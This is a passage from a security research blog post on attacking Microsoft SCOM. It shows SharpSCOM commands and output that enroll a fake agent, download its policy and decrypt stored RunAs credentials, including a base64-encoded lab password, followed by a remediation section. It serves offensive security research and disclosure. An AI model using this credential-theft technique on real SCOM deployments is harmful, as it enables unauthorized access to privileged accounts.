</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>plaintext</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>AyBzGQQgBCD+AAAA0QAAAHicm+eqwsHMwMDxjoGBAUgzOPn6+7IzMjAYpsydEhGdtaT5/5amgITn7CcDvXvsHGVXrdqssdPg/4u/nkB1HED1TEAsnsLAgC7/Mjvcg3XHucOsltGGG3c5TBOwuQM0lYHh9Vs2EMXQBNXLxQTmMhyPh9BAswRANCODBpBMZDBgMGcwYUgG0okMpgy6DGlgthGQZQLkGzAYAllJQL4RUF4XKJIC5CUxGAPFQWLJDJYMqUA9egwVDLkMOQxrzby3iHwsc5+U+dV8QXvtZwDNzT4E</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>[AGENT</span> <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=err>SCOM]</span> <span class=err>[DECRYPT]</span> <span class=err>zlib</span> <span class=err>decompressed</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>nkUkCAMAAAjuAAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB8lRS4w+QR2qqrMouTD/6P1JTU9NCAAAAAIAAAAXZAAAyVFLjD5BHaqqsyi5MP/o/</span><span class=na>elrV0gFuM7DBTlbMbG6QJYQPNwBAAAAAOvtBgAAAAAAggAAAAIAAAAKAgAAAAAAAMdfAAAAAAAAF2QAEAAAAAABACgAAABhADAANwA0AGMAMABhADUALQBmAGMAMAAyAC0ANAA1ADAAMQAtAGIAMgAyAGEALQA1AGQAYgBiADMAMQAyADIAYwA5AGUAZgAuAHgAbQBsAK02S7QU8XZHkmn1N6CHffM=</span>
</span></span><span class=line><span class=cl><span class=s>[+]</span> <span class=err>Received</span> <span class=err>225</span> <span class=err>bytes</span> <span class=err>from</span> <span class=err>server</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Generating</span> <span class=err>policy</span> <span class=err>download</span> <span class=err>message</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>server_guid:</span> <span class=err>C9-51-4B-8C-3E-41-1D-AA-AA-B3-28-B9-30-FF-E8-FD</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_guid:</span> <span class=err>E3-C8-22-E8-64-77-E0-4E-8D-C5-5F-28-C3-44-C1-74</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_length_1:</span> <span class=err>CD-5F-00-00</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_length_2:</span> <span class=err>38-03-00-00</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Downloading</span> <span class=err>policy...</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>[AGENT</span> <span class=nt>&gt;</span>&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): AyBzGQQgBCCoAAAAhQAAAHicm+eqwsHCwMAwA4iZgdjJ19+XnZGBwTBl7pSI6Kwlzf+3NAUkPGd/mR3uwbrj3GFWy2jDjbscpnkC1XFC9YinMDCgy58M9O6xc5RdtWqzxk6D/y/+stvcAZrKwMDKAAE6QMzFBGEzMqCC4/EMDGvNvLeIfCxzn5T51XxBe+1nALTaLn8=
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): nkUkCAQAAACYAAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB+lrV0gFuM7DBTlbMbG6QJZJTU9NCQAAAAMAAAAXZAAA6WtXSAW4zsMFOVsxsbpAlslRS4w+QR2qqrMouTD/6P0HPNwBAAAAAAUAAAAAAAAALAAAAAoCAAAAAAAAAQAAAAAAAAAAAAAAAAAAAMdfAACtNku0FPF2R5Jp9Tegh33z
</span></span><span class=line><span class=cl>[+] Waiting for server response...
</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>plaintext</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>zlib</span> <span class=err>decompressed</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Received 8655 bytes from server
</span></span><span class=line><span class=cl>[+] Successfully wrote policy XML to C:\Users\domainadmin\desktop\policy_new.xml
</span></span><span class=line><span class=cl>[+] Completed
</span></span><span class=line><span class=cl>[+] Disconnected from server
</span></span></code></pre></div><h3 id=decrypting-the-policy>Decrypting the Policy<a hidden class=anchor aria-hidden=true href=#decrypting-the-policy>#</a></h3><p>With the policy XML data returned from the server, we can now attempt decryption. To achieve this, we can reuse our code from earlier by adding an extra argument to provide a private key for decryption in XML format. This private key corresponds to the certificate which was registered with the server during MSG 2.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>SharpSCOM</span><span class=p>.</span><span class=nx>exe</span> <span class=nx>decryptpolicy</span> <span class=o>/</span><span class=nx>data</span><span class=o>:</span><span class=s2>&#34;DAEAAAECAAAQZgA&lt;REDACTED FOR BREVITY&gt; /key:&lt;RSAKeyValue&gt;&lt;Modulus&gt;&lt;REDACTED FOR BREVITY&gt;&lt;/D&gt;&lt;/RSAKeyValue&gt;
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>█▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█
</span></span></span><span class=line><span class=cl><span class=s2>▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █                                                                                 
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>Author: Matt Johnson - SpecterOps - v0.0.1
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>[+] Attempting to decrypt policy data...
</span></span></span><span class=line><span class=cl><span class=s2>[+] Using private key from XML
</span></span></span><span class=line><span class=cl><span class=s2>[+] Key Size: 2048
</span></span></span><span class=line><span class=cl><span class=s2>[+] RSA key loaded successfully from XML
</span></span></span><span class=line><span class=cl><span class=s2>[+] SecureData decrypted successfully!
</span></span></span><span class=line><span class=cl><span class=s2>&lt;SecureStorageContainer&gt;&lt;SecureStorageReferences&gt;&lt;Added /&gt;&lt;Removed /&gt;&lt;Modified /&gt;&lt;/SecureStorageReferences&gt;&lt;SecureStorageElements&gt;&lt;Added&gt;&lt;SecureStorageElement Type=&#34;</span><span class=nx>WindowsCredential</span><span class=err>&#34;</span><span class=o>&gt;</span><span class=p>&lt;</span><span class=nt>SSID</span><span class=p>&gt;</span><span class=mi>00</span><span class=nx>C29753F0583B2A1D9D0D81DF24F0FBA31D72B17A00000000000000000000000000000000000000</span><span class=p>&lt;/</span><span class=nt>SSID</span><span class=p>&gt;&lt;</span><span class=nt>Domain</span><span class=p>&gt;</span><span class=nx>ludus</span><span class=p>&lt;/</span><span class=nt>Domain</span><span class=p>&gt;&lt;</span><span class=nt>UserName</span><span class=p>&gt;</span><span class=nx>runas_account</span><span class=p>&lt;/</span><span class=nt>UserName</span><span class=p>&gt;&lt;</span><span class=nt>Password</span><span class=p>&gt;</span><span class=nx>UwB1AHAAZQByAFMAZQBjAHUAcgBlACEA</span><span class=p>&lt;/</span><span class=nt>Password</span><span class=p>&gt;&lt;/</span><span class=nt>SecureStorageElement</span><span class=p>&gt;&lt;/</span><span class=nt>Added</span><span class=p>&gt;&lt;</span><span class=nt>Removed</span> <span class=p>/&gt;&lt;</span><span class=nt>Modified</span> <span class=p>/&gt;&lt;/</span><span class=nt>SecureStorageElements</span><span class=p>&gt;&lt;/</span><span class=nt>SecureStorageContainer</span><span class=p>&gt;</span>
</span></span></code></pre></div><h3 id=agent-multi-part-messages>Agent Multi-Part Messages<a hidden class=anchor aria-hidden=true href=#agent-multi-part-messages>#</a></h3><p>Up until this point, we had been crafting and sending messages to the SCOM server individually (MSG 1, MSG 2 etc). However, we noticed that this sometimes resulted in unexpected behavior. Most notably, our requests would occasionally hang while waiting for a response from the server.</p><p>Recall from earlier that the SCOM protocol supports multi-part messages, where a combination of messages can be sent at one time. An example of this is shown below where a <code>RegisterAgent</code> (MSG 1), <code>RegisterCertificate</code> (MSG 2) and <code>RequestPolicy</code> (MSG 3) message are all sent inside a single request.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>00000000  9e 45 24 08 01 00 00 00  5e 06 00 00 03 00 00 00  |.E$.....^.......|
</span></span><span class=line><span class=cl>00000010  42 4d 4f 4d 07 01 00 00  af 8d 4a 7c 63 c0 7f 1a  |BMOM......J|c...|
</span></span><span class=line><span class=cl>00000020  38 18 11 07 dc e6 a1 08  3f cd 07 e8 b6 af d1 4b  |8.......?......K|
</span></span><span class=line><span class=cl>00000030  b3 83 ce 95 29 90 54 05  49 4d 4f 4d 09 00 00 00  |....).T.IMOM....|
</span></span><span class=line><span class=cl>00000040  00 00 06 00 1f 64 00 00  3f cd 07 e8 b6 af d1 4b  |.....d..?......K|
</span></span><span class=line><span class=cl>00000050  b3 83 ce 95 29 90 54 05  00 00 00 00 00 00 00 00  |....).T.........|
</span></span><span class=line><span class=cl>00000060  00 00 00 00 00 00 00 00  ab 9e db 01 00 00 00 00  |................|
</span></span><span class=line><span class=cl>00000070  66 00 00 00 00 00 00 00  10 00 00 00 ff ff ff ff  |f...............|
</span></span><span class=line><span class=cl>00000080  ff ff ff ff ff ff ff ff  ff ff ff ff 49 4d 4f 4d  |............IMOM|
</span></span><span class=line><span class=cl>00000090  08 00 00 00 0f 00 00 00  17 64 00 00 3f cd 07 e8  |.........d..?...|
</span></span><span class=line><span class=cl>000000a0  b6 af d1 4b b3 83 ce 95  29 90 54 05 00 00 00 00  |...K....).T.....|
</span></span><span class=line><span class=cl>000000b0  00 00 00 00 00 00 00 00  00 00 00 00 b3 9e db 01  |................|
</span></span><span class=line><span class=cl>000000c0  00 00 00 00 65 00 00 00  00 00 00 00 f6 04 00 00  |....e...........|
</span></span><span class=line><span class=cl>000000d0  b2 04 00 00 10 66 00 00  0b 00 00 00 01 00 00 00  |.....f..........|
</span></span><span class=line><span class=cl><span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>00000270  05 00 30 5b 31 22 30 20  06 03 55 04 03 13 19 53  |..0[1&#34;0 ..U....S|
</span></span><span class=line><span class=cl>00000280  45 52 56 45 52 2d 32 30  31 39 2e 49 4e 49 54 45  |ERVER-2019.INITE|
</span></span><span class=line><span class=cl>00000290  43 48 2e 6c 6f 63 61 6c  31 21 30 1f 06 03 55 04  |CH.local1!0...U.|
</span></span><span class=line><span class=cl>000002a0  0b 13 18 52 75 6e 41 73  20 41 63 63 6f 75 6e 74  |...RunAs Account|
</span></span><span class=line><span class=cl>000002b0  20 45 6e 63 72 79 70 74  69 6f 6e 31 12 30 10 06  | Encryption1.0..|
</span></span><span class=line><span class=cl>000002c0  03 55 04 0a 13 09 4d 69  63 72 6f 73 6f 66 74 30  |.U....Microsoft0|
</span></span><span class=line><span class=cl>000002d0  1e 17 0d 32 35 30 33 32  36 32 33 34 36 30 34 5a  |...250326234604Z|
</span></span><span class=line><span class=cl>000002e0  17 0d 32 35 30 36 32 34  32 33 34 36 30 34 5a 30  |..250624234604Z0|
</span></span><span class=line><span class=cl>000002f0  5b 31 22 30 20 06 03 55  04 03 13 19 53 45 52 56  |[1&#34;0 ..U....SERV|
</span></span><span class=line><span class=cl>00000300  45 52 2d 32 30 31 39 2e  49 4e 49 54 45 43 48 2e  |ER-2019.INITECH.|
</span></span><span class=line><span class=cl>00000310  6c 6f 63 61 6c 31 21 30  1f 06 03 55 04 0b 13 18  |local1!0...U....|
</span></span><span class=line><span class=cl>00000320  52 75 6e 41 73 20 41 63  63 6f 75 6e 74 20 45 6e  |RunAs Account En|
</span></span><span class=line><span class=cl>00000330  63 72 79 70 74 69 6f 6e  31 12 30 10 06 03 55 04  |cryption1.0...U.|
</span></span><span class=line><span class=cl>00000340  0a 13 09 4d 69 63 72 6f  73 6f 66 74 30 82 01 22  |...Microsoft0..&#34;|
</span></span><span class=line><span class=cl><span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>00000590  02 02 02 02 02 02 02 02  02 02 02 00 00 00 00 00  |................|
</span></span><span class=line><span class=cl>000005a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 02 02  |................|
</span></span><span class=line><span class=cl>000005b0  02 02 02 02 02 02 02 02  02 02 02 02 02 02 02 02  |................|
</span></span><span class=line><span class=cl>000005c0  02 02 00 00 00 00 49 4d  4f 4d 09 00 00 00 00 00  |......IMOM......|
</span></span><span class=line><span class=cl>000005d0  03 00 17 64 00 00 3f cd  07 e8 b6 af d1 4b b3 83  |...d..?......K..|
</span></span><span class=line><span class=cl>000005e0  ce 95 29 90 54 05 00 00  00 00 00 00 00 00 00 00  |..).T...........|
</span></span><span class=line><span class=cl>000005f0  00 00 00 00 00 00 ac 9e  db 01 00 00 00 00 67 00  |..............g.|
</span></span><span class=line><span class=cl>00000600  00 00 00 00 00 00 64 00  00 00 5e 00 00 00 32 00  |......d...^...2.|
</span></span><span class=line><span class=cl>00000610  44 00 20 00 35 00 32 00  20 00 38 00 45 00 20 00  |D. .5.2. .8.E. .|
</span></span><span class=line><span class=cl>00000620  45 00 32 00 20 00 45 00  42 00 20 00 31 00 31 00  |E.2. .E.B. .1.1.|
</span></span><span class=line><span class=cl>00000630  20 00 38 00 44 00 20 00  34 00 46 00 20 00 38 00  | .8.D. .4.F. .8.|
</span></span><span class=line><span class=cl>00000640  46 00 20 00 33 00 45 00  20 00 43 00 43 00 20 00  |F. .3.E. .C.C. .|
</span></span><span class=line><span class=cl>00000650  38 00 46 00 20 00 39 00  34 00 20 00 37 00 39 00  |8.F. .9.4. .7.9.|
</span></span><span class=line><span class=cl>00000660  20 00 35 00 35 00 20 00  34 00 42 00 00 00        | .5.5. .4.B...|
</span></span><span class=line><span class=cl>0000066e
</span></span></code></pre></div><p>During our testing, we noted that sending our requests as multi-part messages seemed to eliminate the random timeout issues from the server. As a result, we added a new function to SharpSCOM <code>AutoEnrol</code> which sends the <code>RegisterAgent</code>, <code>RegisterCertificate</code> and <code>RequestPolicy</code> commands together as a multi-part message. A final single <code>DownloadPolicy</code> message is then sent to download the policy XML file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>SharpSCOM.exe autoenrol /managementgroup:SCOM1 /server:scom-om1.ludus.domain /hostname:fake1.ludus.domain /outfile:C:\Users\domainadmin\desktop\policy_new.xml
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>█▀ █ █ ▄▀█ █▀█ █▀█ █▀ █▀▀ █▀█ █▀▄▀█
</span></span><span class=line><span class=cl>▄█ █▀█ █▀█ █▀▄ █▀▀ ▄█ █▄▄ █▄█ █ ▀ █
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Author: Matt Johnson - SpecterOps - v0.0.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[+] Using Hostname: fake1.ludus.domain (24849d66-ef29-d6c4-4ff1-3e77a3e37a54)
</span></span><span class=line><span class=cl>[+] Using Management Group: SCOM1 (f0bc91d0-6de8-1fa8-d6bd-eb98f66672ad)
</span></span><span class=line><span class=cl>[+] Server: scom-om1.ludus.domain:5723
</span></span><span class=line><span class=cl>[+] Preparing to send multi-part agent message...
</span></span><span class=line><span class=cl>[+] Connecting to scom-om1.ludus.domain:5723
</span></span><span class=line><span class=cl>[+] Performing Kerberos SSPI authentication...
</span></span><span class=line><span class=cl>[+] Authentication successful!
</span></span><span class=line><span class=cl>[+] Client authority:
</span></span><span class=line><span class=cl>[+] Client context user: LUDUS.DOMAIN\fake1$
</span></span><span class=line><span class=cl>[+] Client session key: FF-36-61-D8-3D-53-71-B4-F8-4F-AA-E5-D4-0F-FA-1B-1F-34-15-62-F7-F4-3F-11-16-15-4B-47-1F-25-8B-59
</span></span><span class=line><span class=cl>[+] Generating agent registration message
</span></span><span class=line><span class=cl>[+] Generating agent certificate message
</span></span><span class=line><span class=cl>[+] Generating new agent certificate for fake1.ludus.domain
</span></span><span class=line><span class=cl>[+] Subject: CN=fake1.ludus.domain, OU=RunAs Account Encryption, O=Microsoft
</span></span><span class=line><span class=cl>[+] Serial Number: 4718FEBFD26B45A24405206C262C1F66
</span></span><span class=line><span class=cl>[+] Valid From: 10/26/2025 2:32:48 AM UTC
</span></span><span class=line><span class=cl>[+] Valid To: 10/26/2026 2:32:48 AM UTC
</span></span><span class=line><span class=cl>[+] Thumbprint: 7AA2A863985A965AA7E42061F5D344D17B68DB23
</span></span><span class=line><span class=cl>[+] Public Key (Hex): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Certificate (DER Base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Private Key (XML): <span class=nt>&lt;RSAKeyValue&gt;&lt;Modulus&gt;&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;&lt;/D&gt;&lt;/RSAKeyValue&gt;</span>
</span></span><span class=line><span class=cl>[+] Generating agent policy request
</span></span><span class=line><span class=cl>[+] Sending multi-part agent message...
</span></span><span class=line><span class=cl>[+] Sending 1174 bytes to server...
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): <span class=nt>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Waiting for server response...
</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>plaintext</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>AyBzGQQgBCD+AAAA0QAAAHicm+eqwsHEwMDxjoGBgRmInXz9fdkZGRgMU+ZOiYjOWtL8f0tTQMJz9pOB3j12jrKrVm3W2Gnw/8VfT6A6DqB6oF4G8RQGBnT5tLktKprvj1zz/2hXvvhxVYi32x2gqQwMp1v5QBRDE1SvBTOYy3A2HkIDzRIA0YwMGkAyjcGUwYjBmMGSIQUIzRl0GVIZkoBiIJYJkG3BkAxkWQDFjBgMgSxjICsJKJsKps0YEoEiyUCVegwVDLkMOQyPTyi9SCl/4Nd7NF7jsMvBEgDLhkBP</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>[AGENT</span> <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span> <span class=err>SCOM]</span> <span class=err>[DECRYPT]</span> <span class=err>zlib</span> <span class=err>decompressed</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>nkUkCAIAAAjuAAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB8lRS4w+QR2qqrMouTD/6P1JTU9NCAAAAAIAAAAXZAAAyVFLjD5BHaqqsyi5MP/o/WadhCQp78TWT/E+d6PjelRLRtwBAAAAAMuFDgAAAAAAggAAAAIAAAA4AwAAAAAAAM1fAAAAAAAAF2QAEAAAAAABACgAAABmADUAMgAzADkAZABkADcALQBlAGIANQA3AC0ANABlADgAYwAtADgAYgAyADEALQAzAGIAYgA3AGUAYgBiADYAYQAzAGMANAAuAHgAbQBsAOPIIuhkd+</span><span class=na>BOjcVfKMNEwXQ=</span>
</span></span><span class=line><span class=cl><span class=s>[+]</span> <span class=err>Received</span> <span class=err>225</span> <span class=err>bytes</span> <span class=err>from</span> <span class=err>server</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Server</span> <span class=err>registration</span> <span class=err>response</span> <span class=err>received</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Generating</span> <span class=err>policy</span> <span class=err>download</span> <span class=err>message</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>server_guid:</span> <span class=err>C9-51-4B-8C-3E-41-1D-AA-AA-B3-28-B9-30-FF-E8-FD</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_guid:</span> <span class=err>E3-C8-22-E8-64-77-E0-4E-8D-C5-5F-28-C3-44-C1-74</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_length_1:</span> <span class=err>CD-5F-00-00</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>policy_length_2:</span> <span class=err>38-03-00-00</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>Sending</span> <span class=err>148</span> <span class=err>bytes</span> <span class=err>to</span> <span class=err>server...</span>
</span></span><span class=line><span class=cl><span class=err>[+]</span> <span class=err>[AGENT</span> <span class=nt>&gt;</span>&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] plaintext wrap token (base64): AyBzGQQgBCCoAAAAhAAAAHicm+eqwsHMwMAwA4hBtJOvvy87IwODYcrcKRHRWUua/29pCkh4zp42t0VF8/2Ra/4f7coXP64K8QSq44TqEU9hYECXPxno3WPnKLtq1WaNnQb/X/x1crsDNJWBgZUBAnSA2IIZwmZkQAVn4xkYHp9QepFS/sCv92i8xmGXgyUA73oyHQ==
</span></span><span class=line><span class=cl>[+] [AGENT &gt;&gt;&gt;&gt;&gt;&gt; SCOM] [ENCRYPT] zlib decompressed wrap token (base64): nkUkCAMAAACYAAAAAwAAAEJNT00HAQAAMWSdlFhbaqSD/7SCUGDnB2adhCQp78TWT/E+d6PjelRJTU9NCQAAAAMAAAAXZAAAZp2EJCnvxNZP8T53o+N6VMlRS4w+QR2qqrMouTD/6P1CRtwBAAAAAAUAAAAAAAAALAAAADgDAAAAAAAAAQAAAAAAAAAAAAAAAAAAAM1fAADjyCLoZHfgTo3FXyjDRMF0
</span></span><span class=line><span class=cl>[+] Waiting for server response...
</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>plaintext</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] [AGENT <span class=err>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span><span class=nt>&lt; SCOM</span><span class=err>]</span> <span class=err>[DECRYPT]</span> <span class=err>zlib</span> <span class=err>decompressed</span> <span class=err>wrap</span> <span class=err>token</span> <span class=err>(base64):</span> <span class=err>&lt;REDACTED</span> <span class=err>FOR</span> <span class=err>BREVITY</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>[+] Received 8655 bytes from server
</span></span><span class=line><span class=cl>[+] Successfully wrote policy XML to C:\Users\domainadmin\desktop\policy_new.xml
</span></span><span class=line><span class=cl>[+] Completed
</span></span><span class=line><span class=cl>[+] Disconnected from server
</span></span></code></pre></div><h3 id=demo>Demo<a hidden class=anchor aria-hidden=true href=#demo>#</a></h3><p>With a solid understanding of how each message during the enrollment process is generated, we can now attempt to craft these messages ourselves and send them to the SCOM server.</p><p>In this example, we will first create a new computer account using SharpMad and spawn a new session via RunAs. Alternatively, we could run this from a <em>SYSTEM</em> cmd on a domain-joined machine (not currently enrolled with SCOM). We will attempt to enroll the computer with SCOM, register a certificate, and download and decrypt the policy.</p><video width=640 height=360 class=video-shortcode preload=auto controls>
<source src=/scom/scom.mp4 type=video/mp4>There should have been a video here but your browser does not seem
to support it.</video><h3 id=remediation>Remediation<a hidden class=anchor aria-hidden=true href=#remediation>#</a></h3><p>The off-host attacks above can be mitigated by enabling <code>Manual Approval</code> for enrolling new devices. To limit exposure of RunAs credentials, ensure they are only distributed to specific machine accounts via the <code>More secure</code> setting.</p><p>Finally, for monitoring of SQL servers specifically, Microsoft recommends migrating away from traditional RunAs accounts in favor of <a href="https://learn.microsoft.com/en-us/system-center/scom/sql-server-management-pack-service-sid?view=sc-om-2025">Service SIDs</a>.</p><h3 id=references><strong>References</strong><a hidden class=anchor aria-hidden=true href=#references>#</a></h3><p><a href=https://www.stefanroth.net/2016/03/02/scom-how-data-is-encrypted/>https://www.stefanroth.net/2016/03/02/scom-how-data-is-encrypted/</a></p><p><a href=https://blog.orneling.se/2013/11/set-up-operations-manager-ad-integration>https://blog.orneling.se/2013/11/set-up-operations-manager-ad-integration</a></p><p><a href="https://learn.microsoft.com/en-us/system-center/scom/plan-mgmt-group-design?view=sc-om-2025">https://learn.microsoft.com/en-us/system-center/scom/plan-mgmt-group-design?view=sc-om-2025</a></p><p><strong>This article was also posted on <a href=https://specterops.io/blog/2025/12/10/scommand-and-conquer-attacking-system-center-operations-manager-part-2/>specterops.io</a></strong></p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://breakfix.co/posts/extracting-account-connectivity-credentials-accs/><span class=title>Next »</span><br><span>Extracting Account Connectivity Credentials (ACCs) from Symantec Management Agent (aka Altiris)</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://breakfix.co/></a></span>·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>